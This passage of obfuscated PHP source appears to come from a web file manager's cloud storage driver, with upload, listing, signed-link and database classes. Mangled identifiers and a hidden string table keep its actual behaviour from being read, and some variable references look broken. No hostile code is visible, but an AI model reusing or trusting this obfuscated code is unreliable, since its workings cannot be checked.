array($âì‘¿¤ó[1316] => $…×ò°Õü[$âì‘¿¤ó[835]], $âì‘¿¤ó[1306] => $¶êİŒõ§); } private function __errorMessage($·àî§¤‘) { $¶×°€é— =& $_SERVER[™¸œØ®Ü]; if (!$·àî§¤‘) { return $¶×°€é—[12]; } static $ÕéÄ÷È¢ = null; if (!$ÕéÄ÷È¢) { $ÕéÄ÷È¢ = I18n::getType(); } if ($ÕéÄ÷È¢ != $¶×°€é—[1526]) { return $·àî§¤‘; } $òˆ´Òš‘ = array($¶×°€é—[1574] => $¶×°€é—[1575], $¶×°€é—[1576] => $¶×°€é—[1577], $¶×°€é—[1578] => $¶×°€é—[1577], $¶×°€é—[1579] => $¶×°€é—[1580], $¶×°€é—[1581] => $¶×°€é—[1582], $¶×°€é—[1583] => $¶×°€é—[1584], $¶×°€é—[1585] => $¶×°€é—[1586]); return isset($òˆ´Òš‘[$·àî§¤‘]) ? $òˆ´Òš‘[$·àî§¤‘] : $·àî§¤‘; } public function mkfile($’ï ®•, $ªô„—Æ½ = '', $¯¡éíÒ† = REPEAT_RENAME) { if ($this->setContent($’ï ®•, $ªô„—Æ½)) { return $this->getPathOuter($’ï ®•); } return !1; } public function mkdir($ñŠåøÖ§, $îÀâ»ª = REPEAT_SKIP) { $’…ıÑí =& $_SERVER[™¸œØ®Ü]; $Ã÷õ§óÏ = trim($ñŠåøÖ§, $’…ıÑí[8]); if ($this->_isFolder($Ã÷õ§óÏ)) { return $this->getPathOuter($Ã÷õ§óÏ); } $ê¬É‘Îó = array($’…ıÑí[1587]); $àê©·Ëğ = $this->ussRequest($Ã÷õ§óÏ, $’…ıÑí[290], !1, $ê¬É‘Îó); return $àê©·Ëğ[$’…ıÑí[1316]] ? $this->getPathOuter($Ã÷õ§óÏ) : !1; } public function copyFile($×ªáÔé«, $ŞõŒ«Ã§) { $ç°ó„™ =& $_SERVER[™¸œØ®Ü]; $¨ âö’¡ = array($ç°ó„™[1588] . "\x2f{$this->bucket}\x2f{$×ªáÔé«}", $ç°ó„™[1589]); $ºœ„ö = $this->ussRequest($ŞõŒ«Ã§, $ç°ó„™[255], !1, $¨ âö’¡); return $ºœ„ö[$ç°ó„™[1316]] ? !0 : $this->getPathOuter($ŞõŒ«Ã§); } public function moveFile($‰øŞ×, $Ş¬ôüö×) { $¬İÒªĞÏ =& $_SERVER[™¸œØ®Ü]; $Ş“û™† = array($¬İÒªĞÏ[1590] . "\x2f{$this->bucket}\x2f{$‰øŞ×}", $¬İÒªĞÏ[1589]); $¦ÜÁ„§º = $this->ussRequest($Ş¬ôüö×, $¬İÒªĞÏ[255], !1, $Ş“û™†); return $¦ÜÁ„§º[$¬İÒªĞÏ[1316]] ? !0 : $this->getPathOuter($Ş¬ôüö×); } public function delFile($›Õçå¼) { $œáûê‘ =& $_SERVER[™¸œØ®Ü]; $õ¨È¾ƒ = $this->ussRequest($›Õçå¼, $œáûê‘[1591]); return $õ¨È¾ƒ[$œáûê‘[1316]] ? !0 : !1; } public function delFolder($«ãâù) { $„…ğç³™ =& $_SERVER[™¸œØ®Ü]; if (!$this->exist($«ãâù)) { return !0; } $this->listItemCache = !1; $ÖËÛ‹ê = $¹”€Ì¼æ = array(); $this->fileList($«ãâù, $ÖËÛ‹ê, $¹”€Ì¼æ, !0); $this->listItemCache = !0; foreach ($¹”€Ì¼æ as $Ö³ÑñÉ“) { $èÑš° = $this->ussRequest($Ö³ÑñÉ“[$„…ğç³™[32]], $„…ğç³™[1591]); if (!$èÑš°[$„…ğç³™[1316]]) { return !1; } } usort($ÖËÛ‹ê, function ($Ï¹ˆœ˜, $–ğØÖÏ) { $ßûıš =& $_SERVER[™¸œØ®Ü]; return substr_count($–ğØÖÏ, $ßûıš[8]) - substr_count($Ï¹ˆœ˜, $ßûıš[8]); }); foreach ($ÖËÛ‹ê as $îœÙŠä™) { $èÑš° = $this->ussRequest($îœÙŠä™, $„…ğç³™[1591]); if (!$èÑš°[$„…ğç³™[1316]]) { return !1; } } $èÑš° = $this->ussRequest($«ãâù, $„…ğç³™[1591]); return $èÑš°[$„…ğç³™[1316]]; } public function rename($„·ğĞæº, $ò­‰æú°) { if ($this->isFile($„·ğĞæº)) { $ò­‰æú° = get_path_father($„·ğĞæº) . $ò­‰æú°; return $this->moveFile($„·ğĞæº, $ò­‰æú°); } return $this->renameObject($„·ğĞæº, $ò­‰æú°); } public function fileInfo($°ÓË¾‚Ü, $Éé˜ÆÑí = false, $ê™áÒöÈ = array()) { $ñøë¨·Ê =& $_SERVER[™¸œØ®Ü]; $ÚÎÜ¬… = array($ñøë¨·Ê[32] => $this->pathThis($°ÓË¾‚Ü), $ñøë¨·Ê[87] => $this->getPathOuter($ñøë¨·Ê[8] . $°ÓË¾‚Ü), $ñøë¨·Ê[33] => $ñøë¨·Ê[232], $ñøë¨·Ê[79] => isset($ê™áÒöÈ[$ñøë¨·Ê[79]]) ? $ê™áÒöÈ[$ñøë¨·Ê[79]] : 0, $ñøë¨·Ê[169] => $this->ext($°ÓË¾‚Ü)); if ($Éé˜ÆÑí) { return $ÚÎÜ¬…; } $ÚÎÜ¬…[$ñøë¨·Ê[233]] = $ÚÎÜ¬…[$ñøë¨·Ê[88]] = 0; $ÚÎÜ¬…[$ñøë¨·Ê[234]] = $ÚÎÜ¬…[$ñøë¨·Ê[235]] = !0; if (empty($ê™áÒöÈ)) { $ê™áÒöÈ = $this->objectMeta($°ÓË¾‚Ü); if (!$ê™áÒöÈ) { return $ÚÎÜ¬…; } } $ÚÎÜ¬…[$ñøë¨·Ê[233]] = intval($ê™áÒöÈ[$ñøë¨·Ê[1592]]); $ÚÎÜ¬…[$ñøë¨·Ê[88]] = intval($ê™áÒöÈ[$ñøë¨·Ê[1593]]); $ÚÎÜ¬…[$ñøë¨·Ê[79]] = $ê™áÒöÈ[$ñøë¨·Ê[79]]; return $ÚÎÜ¬…; } public function folderInfo($š—ÏÖ—ó, $Šèˆ¤â = false) { $ŒŠÇÅõ„ =& $_SERVER[™¸œØ®Ü]; $–û±µê‡ = array($ŒŠÇÅõ„[32] => $this->pathThis($š—ÏÖ—ó), $ŒŠÇÅõ„[87] => $this->getPathOuter($ŒŠÇÅõ„[8] . $š—ÏÖ—ó), $ŒŠÇÅõ„[33] => $ŒŠÇÅõ„[78]); if ($Šèˆ¤â) { return $–û±µê‡; } $–û±µê‡[$ŒŠÇÅõ„[233]] = $–û±µê‡[$ŒŠÇÅõ„[88]] = 0; $–û±µê‡[$ŒŠÇÅõ„[234]] = $–û±µê‡[$ŒŠÇÅõ„[235]] = !0; if (empty($­“÷ùÊ†)) { $­“÷ùÊ† = $this->objectMeta($š—ÏÖ—ó); if (!$­“÷ùÊ†) { return $–û±µê‡; } } $–û±µê‡[$ŒŠÇÅõ„[233]] = intval($­“÷ùÊ†[$ŒŠÇÅõ„[1592]]); $–û±µê‡[$ŒŠÇÅõ„[88]] = intval($­“÷ùÊ†[$ŒŠÇÅõ„[1593]]); return $–û±µê‡; } private function listObjs($èä°„˜Õ, $ÎâŸåáÀ = 0, $ê¹±Îñ = 1000) { $­ÛØÔ =& $_SERVER[™¸œØ®Ü]; $Ú››¤¾› = array($­ÛØÔ[1594], $­ÛØÔ[1595] . $ê¹±Îñ); if ($ÎâŸåáÀ) { $Ú››¤¾›[] = $­ÛØÔ[1596] . $ÎâŸåáÀ; } $¶›Ëòô = $this->ussRequest($èä°„˜Õ, $­ÛØÔ[1518], !1, $Ú››¤¾›); return !$¶›Ëòô[$­ÛØÔ[1316]] ? !1 : $¶›Ëòô[$­ÛØÔ[1306]]; } private function fileList($¦ùÒòêí, &$·‚òÀ€Ñ, &$¢ó‹Ääò, $¢š¡»İ = false) { $‹ıĞ¥âš =& $_SERVER[™¸œØ®Ü]; $¹¾ŠÛáÓ = $‹ıĞ¥âš[12]; $¦œÜ”Êé = 1000; $ƒËÃ­ùı = rtrim($¦ùÒòêí, $‹ıĞ¥âš[8]) . $‹ıĞ¥âš[8]; while (!0) { check_abort(); $ê‘Ì†€Ş = $this->listObjs($¦ùÒòêí, $¹¾ŠÛáÓ, $¦œÜ”Êé); if (!$ê‘Ì†€Ş) { return !1; } $¹¾ŠÛáÓ = isset($ê‘Ì†€Ş[$‹ıĞ¥âš[1597]]) ? $ê‘Ì†€Ş[$‹ıĞ¥âš[1597]] : $‹ıĞ¥âš[12]; $ºÁ¼ø‰ù = isset($ê‘Ì†€Ş[$‹ıĞ¥âš[1598]]) ? $ê‘Ì†€Ş[$‹ıĞ¥âš[1598]] : array(); foreach ($ºÁ¼ø‰ù as $ı–÷Õ®÷) { $ËÃïİ¯˜ = $ı–÷Õ®÷[$‹ıĞ¥âš[33]] == $‹ıĞ¥âš[78] ? !0 : !1; $Ùå›œÓ… = ltrim($ƒËÃ­ùı . $ı–÷Õ®÷[$‹ıĞ¥âš[32]], $‹ıĞ¥âš[8]) . ($ËÃïİ¯˜ ? $‹ıĞ¥âš[8] : $‹ıĞ¥âš[12]); $àÎµãªñ = array($‹ıĞ¥âš[32] => $Ùå›œÓ…, $‹ıĞ¥âš[33] => $ËÃïİ¯˜ ? $‹ıĞ¥âš[78] : $‹ıĞ¥âš[232], $‹ıĞ¥âš[79] => $ı–÷Õ®÷[$‹ıĞ¥âš[414]], $‹ıĞ¥âš[1593] => $ı–÷Õ®÷[$‹ıĞ¥âš[1599]]); $this->cacheMethodInfoSet($Ùå›œÓ…, $ËÃïİ¯˜, $àÎµãªñ); if ($ËÃïİ¯˜) { $·‚òÀ€Ñ[] = $Ùå›œÓ…; if ($¢š¡»İ) { $this->fileList($Ùå›œÓ…, $·‚òÀ€Ñ, $¢ó‹Ääò, $¢š¡»İ); } continue; } $¢ó‹Ääò[] = $àÎµãªñ; } if (count($ºÁ¼ø‰ù) < $¦œÜ”Êé) { break; } } $this->cacheMethodInfoSet($¦ùÒòêí, !0); } public function listPath($ø™‡´ú, $Èßô®ë = false) { $ÂÌğÙÙ‰ =& $_SERVER[™¸œØ®Ü]; $çĞŒÖæÏ = $ØÕ¬Á‹ = array(); $this->fileList($ø™‡´ú, $çĞŒÖæÏ, $ØÕ¬Á‹); foreach ($çĞŒÖæÏ as $Ò…»®ğó => $üÄ¬ºøÄ) { $çĞŒÖæÏ[$Ò…»®ğó] = $this->folderInfo($üÄ¬ºøÄ, $Èßô®ë); } foreach ($ØÕ¬Á‹ as $Ò…»®ğó => $üÄ¬ºøÄ) { $ØÕ¬Á‹[$Ò…»®ğó] = $this->fileInfo($üÄ¬ºøÄ[$ÂÌğÙÙ‰[32]], $Èßô®ë, $üÄ¬ºøÄ); } return array($ÂÌğÙÙ‰[85] => $çĞŒÖæÏ, $ÂÌğÙÙ‰[86] => $ØÕ¬Á‹); } public function has($à„ÏŠ, $“ş‹•»¾ = false, $¢ªş©Ğ» = true) { $Â”È’¶ =& $_SERVER[™¸œØ®Ü]; $ı¢Ã¾ş = $Â”È’¶[12]; $ö½Úê©­ = 500; $Åå´¶œû = 0; $ ú„¦Ã = 0; $¬…¬ó¯Á = rtrim($à„ÏŠ, $Â”È’¶[8]) . $Â”È’¶[8]; while (!0) { check_abort(); $öï§³›² = $this->listObjs($à„ÏŠ, $ı¢Ã¾ş, $ö½Úê©­); if (!$öï§³›²) { return !1; } $ı¢Ã¾ş = isset($öï§³›²[$Â”È’¶[1597]]) ? $öï§³›²[$Â”È’¶[1597]] : $Â”È’¶[12]; $Âòø¾¡ = isset($öï§³›²[$Â”È’¶[1598]]) ? $öï§³›²[$Â”È’¶[1598]] : array(); if (empty($Âòø¾¡)) { break; } $ˆĞ‰Ùïñ = array_filter($Âòø¾¡, function ($„ÃÈ« ) { $…‘‰‘€é =& $_SERVER[™¸œØ®Ü]; return $„ÃÈ« [$…‘‰‘€é[33]] == $…‘‰‘€é[78]; }); $Öï¸‚† = count($Âòø¾¡); $ˆĞ‰Ùïñ = count($ˆĞ‰Ùïñ); $ª´µÄ‡ì = $Öï¸‚† - $ˆĞ‰Ùïñ; if ($“ş‹•»¾) { $ ú„¦Ã += $ˆĞ‰Ùïñ; $Åå´¶œû += $ª´µÄ‡ì; if ($Öï¸‚† < $ö½Úê©­) { break; } continue; } if ($¢ªş©Ğ») { if ($ª´µÄ‡ì) { return !0; } } else { if ($ˆĞ‰Ùïñ) { return !0; } } if ($Öï¸‚† < $ö½Úê©­) { break; } } if ($“ş‹•»¾) { return array($Â”È’¶[241] => $Åå´¶œû, $Â”È’¶[242] => $ ú„¦Ã); } return !1; } public function listAll($ãäñ¾†‰) { $…ÙÂÆÈ =& $_SERVER[™¸œØ®Ü]; $‡Â±¸„‘ = $ßÕÎˆò = array(); $this->fileList($ãäñ¾†‰, $‡Â±¸„‘, $ßÕÎˆò, !0); $şÌİÒš× = array_to_keyvalue($ßÕÎˆò, $…ÙÂÆÈ[32]); foreach ($‡Â±¸„‘ as $–³¨ñÒ) { if (is_string($–³¨ñÒ)) { $şÌİÒš×[$–³¨ñÒ] = array($…ÙÂÆÈ[79] => 0); } } return $this->listAllFiles($ãäñ¾†‰, $şÌİÒš×); } public function canRead($íªÏ´ß) { return $this->exist($íªÏ´ß) ? !0 : !1; } public function canWrite($›£Ç¥½) { return $this->exist($›£Ç¥½) ? !0 : !1; } public function getContent($†€ã±Áº) { return $this->fileSubstr($†€ã±Áº, 0, -1); } public function setContent($¯°ÂÎì©, $“ ¾¦×· = '') { $ÑıÏ£®ı =& $_SERVER[™¸œØ®Ü]; if (!$“ ¾¦×·) { $úË‚²ã¸ = $this->ussRequest($¯°ÂÎì©, $ÑıÏ£®ı[290]); return $úË‚²ã¸[$ÑıÏ£®ı[1316]]; } $Å“ÆĞİ³ = $this->tempFile($this->pathThis($¯°ÂÎì©)); file_put_contents($Å“ÆĞİ³, $“ ¾¦×·); if ($this->upload($¯°ÂÎì©, $Å“ÆĞİ³)) { $this->tempFileRemve($Å“ÆĞİ³); return !0; } return !1; } public function fileSubstr($óÒáåîı, $¹‘åû‰, $îšüé•‘) { $Ş€úæ¡” =& $_SERVER[™¸œØ®Ü]; if (!($—ÏğØ» = $this->link($óÒáåîı))) { return !1; } $Ô‰½ş™é = !1; if ($îšüé•‘ > 0) { $åîÎ¡ÓÃ = $¹‘åû‰ + $îšüé•‘ - 1; $Ô‰½ş™é = array($Ş€úæ¡”[1558] . $¹‘åû‰ . $Ş€úæ¡”[464] . $åîÎ¡ÓÃ); } $Ó½˜Šû¥ = url_request($—ÏğØ», $Ş€úæ¡”[1518], !1, $Ô‰½ş™é); return $Ó½˜Šû¥[$Ş€úæ¡”[835]] ? $Ó½˜Šû¥[$Ş€úæ¡”[1306]] : !1; } public function upload($„ãã‚¿í, $Ëæ‹şÌ¼, $´Å˜Ù¦â = false, $ÆÕ¤ßÙ„ = REPEAT_REPLACE) { $¢Š«éº« =& $_SERVER[™¸œØ®Ü]; $·´Ìş‚Ã = IO::size($Ëæ‹şÌ¼); if ($·´Ìş‚Ã <= 1024 * 1024 * 200) { $Æ‚šğ—ê = array($¢Š«éº«[1600] . $Ëæ‹şÌ¼); $’ÖÕœü = $this->ussRequest($„ãã‚¿í, $¢Š«éº«[255], $Æ‚šğ—ê); return $’ÖÕœü[$¢Š«éº«[1316]] ? $this->getPathOuter($„ãã‚¿í) : !1; } $¹íÌ¾Ğ = 1024 * 1024 * 10; $«òğ’ˆª = array($¢Š«éº«[1601], $¢Š«éº«[1602] . $·´Ìş‚Ã, $¢Š«éº«[1603], $¢Š«éº«[1604] . $¹íÌ¾Ğ); $’ÖÕœü = $this->ussRequest($„ãã‚¿í, $¢Š«éº«[255], !1, $«òğ’ˆª); if (!$’ÖÕœü[$¢Š«éº«[1316]]) { return !1; } $µØè×Ş = $’ÖÕœü[$¢Š«éº«[1306]]; $œ¸’Ñ´„ = 0; $¿—‚• = $µØè×Ş[$¢Š«éº«[1605]]; $©Ïó¶æ‹ = fopen($Ëæ‹şÌ¼, $¢Š«éº«[1481]); if (!$©Ïó¶æ‹) { return !1; } do { $©‹ˆ¦è = $µØè×Ş[$¢Š«éº«[1606]]; fseek_64($©Ïó¶æ‹, $œ¸’Ñ´„); $Ö°½Í¡Ô = fread($©Ïó¶æ‹, $©‹ˆ¦è); $½¥Ó—í¥ = 0; do { $½¥Ó—í¥++; $µØè×Ş = $this->uploadPart($„ãã‚¿í, $µØè×Ş, $Ö°½Í¡Ô); } while (!$µØè×Ş && $½¥Ó—í¥ < 3); if (!$µØè×Ş) { return !1; } $¿—‚• = $µØè×Ş[$¢Š«éº«[1605]]; $œ¸’Ñ´„ += $©‹ˆ¦è; } while ($¿—‚• != -1); fclose($©Ïó¶æ‹); $«òğ’ˆª = array($¢Š«éº«[1607], $¢Š«éº«[1608] . $µØè×Ş[$¢Š«éº«[1609]], $¢Š«éº«[1603]); $’ÖÕœü = $this->ussRequest($„ãã‚¿í, $¢Š«éº«[255], !1, $«òğ’ˆª); return $’ÖÕœü[$¢Š«éº«[1316]] ? $this->getPathOuter($ìæ‘õ¹ä) : !1; } private function uploadPart($ÆÚå¤Û, $ÑĞ¯Ã¨, &$İôß‚€³) { $Î‘Øà‘ =& $_SERVER[™¸œØ®Ü]; $·©ÜãÎ = array($Î‘Øà‘[1610], $Î‘Øà‘[1608] . $ÑĞ¯Ã¨[$Î‘Øà‘[1609]], $Î‘Øà‘[1611] . $ÑĞ¯Ã¨[$Î‘Øà‘[1605]], $Î‘Øà‘[146] . $ÑĞ¯Ã¨[$Î‘Øà‘[1606]]); $ŞÛÎèÖí = $this->ussRequest($ÆÚå¤Û, $Î‘Øà‘[255], $İôß‚€³, $·©ÜãÎ); return !$ŞÛÎèÖí[$Î‘Øà‘[1316]] ? $ŞÛÎèÖí[$Î‘Øà‘[1316]] : $ŞÛÎèÖí[$Î‘Øà‘[1306]]; } public function uploadFormData($Ü“ Š…¶, $ğÓí¸å¿ = 3600) { return $this->uploadPolicy($Ü“ Š…¶, $ğÓí¸å¿); } public function uploadMultiData($¯šñ©£”, $¾ˆûƒ•ä = 3600) { $Å¯Œ”ÖÙ =& $_SERVER[™¸œØ®Ü]; $›éŞùÎ = (int) $GLOBALS[$Å¯Œ”ÖÙ[7]][$Å¯Œ”ÖÙ[79]]; return $this->uploadPolicy($¯šñ©£”, $¾ˆûƒ•ä, $›éŞùÎ); } private function uploadPolicy($šÁ´ˆ¹, $ª«Ë¢— = 3600, $‘­÷…å  = 0) { $çş§Î¹ =& $_SERVER[™¸œØ®Ü]; $‰¶èíÅ = $çş§Î¹[8] . $this->bucket; $ªì³èÂ­ = gmdate($çş§Î¹[1516]); $ú”’§İš = array($çş§Î¹[1612] => $this->bucket, $çş§Î¹[1613] => $šÁ´ˆ¹, $çş§Î¹[1614] => time() + $ª«Ë¢—, $çş§Î¹[1615] => $ªì³èÂ­); if ($‘­÷…å ) { $ú”’§İš[$çş§Î¹[1501]] = $‘­÷…å ; } $£º±¶Ëº = base64_encode(json_encode($ú”’§İš)); $‘ôªõ‰ı = base64_encode(hash_hmac($çş§Î¹[1569], "\x50\x4f\123\x54\46{$‰¶èíÅ}\x26{$ªì³èÂ­}\46{$£º±¶Ëº}", md5("{$this->userpass}"), !0)); $µ™èÓ¿ã = array($çş§Î¹[279] => $£º±¶Ëº, $çş§Î¹[1616] => "\x55\x50\x59\125\x4e\x20{$this->username}\72{$‘ôªõ‰ı}", $çş§Î¹[208] => $this->endpoint . $‰¶èíÅ); return $µ™èÓ¿ã; } public function download($’Á´Û“, $ºğğÌ´Ç) { $ëêÄì‹± = IO::getPathInner(IO::mkfile($ºğğÌ´Ç)); if (!($ÕŠüÔØï = $this->link($’Á´Û“))) { return !1; } $ÇÙ•ˆà = 0; $Ğˆ½ù¾× = 1024 * 200; $›ÄéÁÃ© = fopen($ëêÄì‹±, $_SERVER[™¸œØ®Ü][1564]); while (!0) { $—ªÒ = $this->fileSubstr($’Á´Û“, $ÇÙ•ˆà, $Ğˆ½ù¾×); if ($—ªÒ === !1) { return !1; } fwrite($›ÄéÁÃ©, $—ªÒ); $ÇÙ•ˆà += $Ğˆ½ù¾×; if (strlen($—ªÒ) < $Ğˆ½ù¾×) { break; } } fclose($›ÄéÁÃ©); return $ºğğÌ´Ç; } public function link($’ÌÁÍš, $İàÍˆŞê = array()) { $ßºÑ–›Í =& $_SERVER[™¸œØ®Ü]; $’ÌÁÍš = trim($’ÌÁÍš, $ßºÑ–›Í[8]); if (!empty($this->token)) { $Òéï°µà = strtotime(date($ßºÑ–›Í[1617])); $‰—êé¡ = substr(md5($this->token . $ßºÑ–›Í[286] . $Òéï°µà . $ßºÑ–›Í[1618] . $’ÌÁÍš), 12, 8) . $Òéï°µà; $İàÍˆŞê[] = $ßºÑ–›Í[1619] . $‰—êé¡; } $ÍöåÊÏû = !empty($İàÍˆŞê) ? $ßºÑ–›Í[76] . implode($ßºÑ–›Í[286], $İàÍˆŞê) : $ßºÑ–›Í[12]; return $this->getHost() . $ßºÑ–›Í[8] . $this->pathEncode($’ÌÁÍš) . $ÍöåÊÏû; } public function fileOut($Û¤É°î¹, $Ğéİ–Î‹ = false, $àÃ–ÑÎÎ = false, $¯·ïû“Ñ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Û¤É°î¹, $Ğéİ–Î‹, $àÃ–ÑÎÎ, $¯·ïû“Ñ); } if (!$àÃ–ÑÎÎ) { $àÃ–ÑÎÎ = $this->pathThis($Û¤É°î¹); } $—›Ä˜úÈ = $Ğéİ–Î‹ ? array($_SERVER[™¸œØ®Ü][1620] . rawurlencode($àÃ–ÑÎÎ)) : array(); $Á©ºâ«´ = $this->link($Û¤É°î¹, $—›Ä˜úÈ); $this->fileOutLink($Á©ºâ«´); } public function fileOutServer($À†¹ºíò, $¼—»Ìğ = false, $ŞãÁ°ÒÛ = false, $©íÅ‹¯× = '') { parent::fileOut($À†¹ºíò, $¼—»Ìğ, $ŞãÁ°ÒÛ, $©íÅ‹¯×); } public function fileOutImage($úõî•œ», $ğéèò’È = 250) { $ÛİøÊ°§ = $this->link($úõî•œ» . $_SERVER[™¸œØ®Ü][1621] . $ğéèò’È); $this->fileOutLink($ÛİøÊ°§); } public function fileOutImageServer($³£µœ™¼, $¦·Ãåœ‰ = 250) { parent::fileOutImage($³£µœ™¼, $¦·Ãåœ‰); } public function hashMd5($—îÖ‹Îš) { $šÇÔ¬ï  =& $_SERVER[™¸œØ®Ü]; $îõüºœ– = $this->_objectMeta($—îÖ‹Îš); return isset($îõüºœ–[$šÇÔ¬ï [247]]) ? $îõüºœ–[$šÇÔ¬ï [247]] : !1; } public function size($£à¿– ™) { $œ„ãº•… = $this->objectMeta($£à¿– ™); return $œ„ãº•… ? $œ„ãº•…[$_SERVER[™¸œØ®Ü][79]] : 0; } public function info($øã·Ä¡) { if ($this->isFolder($øã·Ä¡)) { return $this->folderInfo($øã·Ä¡); } else { if ($this->isFile($øã·Ä¡)) { return $this->fileInfo($øã·Ä¡); } } return !1; } public function exist($ÏÅò Ó³) { return $this->isFile($ÏÅò Ó³) || $this->isFolder($ÏÅò Ó³); } public function isFile($Å¸×‚¨ ) { return !$this->isFolder($Å¸×‚¨ ) && $this->objectMeta($Å¸×‚¨ ); } public function isFolder($¶ã˜ïÔ­) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][179], $¶ã˜ïÔ­); } protected function objectMeta($µ°Ğ…Ñô) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][181], $µ°Ğ…Ñô); } protected function _objectMeta($¿½¿¸ıÉ) { $ıÂãÛÔ¤ =& $_SERVER[™¸œØ®Ü]; if ($¿½¿¸ıÉ == $ıÂãÛÔ¤[12] || $¿½¿¸ıÉ == $ıÂãÛÔ¤[8]) { return array(); } $­´¾¯¶ç = $this->ussRequest($¿½¿¸ıÉ, $ıÂãÛÔ¤[1622]); if (!$­´¾¯¶ç[$ıÂãÛÔ¤[1316]]) { return null; } $æ°ì¨ñ› = isset($­´¾¯¶ç[$ıÂãÛÔ¤[1306]]) ? $­´¾¯¶ç[$ıÂãÛÔ¤[1306]] : array(); if (!isset($æ°ì¨ñ›[$ıÂãÛÔ¤[1623]])) { return null; } $¢ƒ÷û³ = array($ıÂãÛÔ¤[33] => isset($æ°ì¨ñ›[$ıÂãÛÔ¤[1623]]) ? $æ°ì¨ñ›[$ıÂãÛÔ¤[1623]] : null, $ıÂãÛÔ¤[79] => isset($æ°ì¨ñ›[$ıÂãÛÔ¤[1624]]) ? $æ°ì¨ñ›[$ıÂãÛÔ¤[1624]] : null, $ıÂãÛÔ¤[247] => isset($æ°ì¨ñ›[$ıÂãÛÔ¤[1625]]) ? $æ°ì¨ñ›[$ıÂãÛÔ¤[1625]] : null, $ıÂãÛÔ¤[1592] => isset($æ°ì¨ñ›[$ıÂãÛÔ¤[1626]]) ? $æ°ì¨ñ›[$ıÂãÛÔ¤[1626]] : null); $¢ƒ÷û³[$ıÂãÛÔ¤[1593]] = isset($æ°ì¨ñ›[$ıÂãÛÔ¤[1627]]) ? strtotime($æ°ì¨ñ›[$ıÂãÛÔ¤[1627]]) : $¢ƒ÷û³[$ıÂãÛÔ¤[1592]]; return $¢ƒ÷û³; } protected function _isFolder($ĞÌ£‰ìÅ) { $ÍäÇÃÃĞ =& $_SERVER[™¸œØ®Ü]; if ($ĞÌ£‰ìÅ == $ÍäÇÃÃĞ[12] || $ĞÌ£‰ìÅ == $ÍäÇÃÃĞ[8]) { return !0; } $Ÿ®ˆ™’ = $this->_objectMeta($ĞÌ£‰ìÅ); return isset($Ÿ®ˆ™’[$ÍäÇÃÃĞ[33]]) && $Ÿ®ˆ™’[$ÍäÇÃÃĞ[33]] == $ÍäÇÃÃĞ[78] ? !0 : !1; } } goto B°ŞÖŠÉ±Ì; c¯½œ¬Ã¬‘: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ƒ§¿°ş =& $_SERVER[™¸œØ®Ü]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ƒ§¿°ş[6]] =& $config; $this->values[$ƒ§¿°ş[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ƒ§¿°ş[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($µÜø§Ú½) { if (1 === func_num_args()) { $this->{$µÜø§Ú½} = new $µÜø§Ú½(); } else { $¬ÌÑÔ = new ReflectionClass($µÜø§Ú½); $ã‡Ù¶îñ = func_get_args(); array_shift($ã‡Ù¶îñ); $this->{$µÜø§Ú½} = $¬ÌÑÔ->newInstanceArgs($ã‡Ù¶îñ); } return $this->{$µÜø§Ú½}; } public function routeBind($ñò³¦Ù, $‰Â¨ı¥ï, $†ÁŞ‘æ = 3) { $ÜùÉçĞÆ =& $_SERVER[™¸œØ®Ü]; $úÖú—Ï = $this->in[$ÜùÉçĞÆ[9]]; $ñò³¦Ù = str_replace($ÜùÉçĞÆ[10], $ÜùÉçĞÆ[11], trim(trim($ñò³¦Ù, $ÜùÉçĞÆ[8]), $ÜùÉçĞÆ[12])); if (!$ñò³¦Ù || count($úÖú—Ï) <= $†ÁŞ‘æ) { return !1; } $Ü„¶÷Î£ = !0; $ÉÛº¯¡µ = explode($ÜùÉçĞÆ[8], $ñò³¦Ù); for ($…›éå‰ = 0; $…›éå‰ < count($ÉÛº¯¡µ); $…›éå‰++) { if ($ÉÛº¯¡µ[$…›éå‰] != $úÖú—Ï[$†ÁŞ‘æ + $…›éå‰]) { $Ü„¶÷Î£ = !1; break; } } if (!$Ü„¶÷Î£) { return; } call_user_func_array(array($this, $‰Â¨ı¥ï), array()); } public function routeArgs($Çö ÷Ûª = 3) { $¦Ú×àÄ­ = $this->in[$_SERVER[™¸œØ®Ü][9]]; if (count($¦Ú×àÄ­) <= $Çö ÷Ûª) { return array(); } $¢éÈ™ı = array(); for ($ûââ–áç = $Çö ÷Ûª; $ûââ–áç < count($¦Ú×àÄ­); $ûââ–áç += 2) { $¢éÈ™ı[$¦Ú×àÄ­[$ûââ–áç]] = $¦Ú×àÄ­[$ûââ–áç + 1]; $this->in[$¦Ú×àÄ­[$ûââ–áç]] = $¦Ú×àÄ­[$ûââ–áç + 1]; } return $¢éÈ™ı; } protected function assign($¢†³ƒÓ¹, $éä½”î) { $this->values[$¢†³ƒÓ¹] = $éä½”î; } protected function display($ßÉãÙÇ’) { ob_end_clean(); extract($this->values); require $this->tpl . $ßÉãÙÇ’; } } class DbSqliteBase extends Db { public function __construct($£¨Ùñ‘¦ = '') { $í¸ÍÄË¾ =& $_SERVER[™¸œØ®Ü]; if (!extension_loaded($í¸ÍÄË¾[13])) { think_exception(think_lang($í¸ÍÄË¾[14]) . $í¸ÍÄË¾[15]); } if (!empty($£¨Ùñ‘¦)) { if (!isset($£¨Ùñ‘¦[$í¸ÍÄË¾[16]])) { $£¨Ùñ‘¦[$í¸ÍÄË¾[16]] = 438; } $this->config = $£¨Ùñ‘¦; if (empty($this->config[$í¸ÍÄË¾[17]])) { $this->config[$í¸ÍÄË¾[17]] = array(); } } } public function connect($…×õŞ² = '', $é¶¿ĞÆÉ = 0) { $Æ™ÉõÛ‚ =& $_SERVER[™¸œØ®Ü]; if (!isset($this->linkID[$é¶¿ĞÆÉ])) { if (empty($…×õŞ²)) { $…×õŞ² = $this->config; } $º·Š¹ùÇ = !empty($…×õŞ²[$Æ™ÉõÛ‚[17]][$Æ™ÉõÛ‚[18]]) ? $…×õŞ²[$Æ™ÉõÛ‚[17]][$Æ™ÉõÛ‚[18]] : $this->pconnect; $Ê¢ÅĞ´ = $º·Š¹ùÇ ? $Æ™ÉõÛ‚[19] : $Æ™ÉõÛ‚[20]; $this->linkID[$é¶¿ĞÆÉ] = $Ê¢ÅĞ´($…×õŞ²[$Æ™ÉõÛ‚[21]], $…×õŞ²[$Æ™ÉõÛ‚[16]]); if 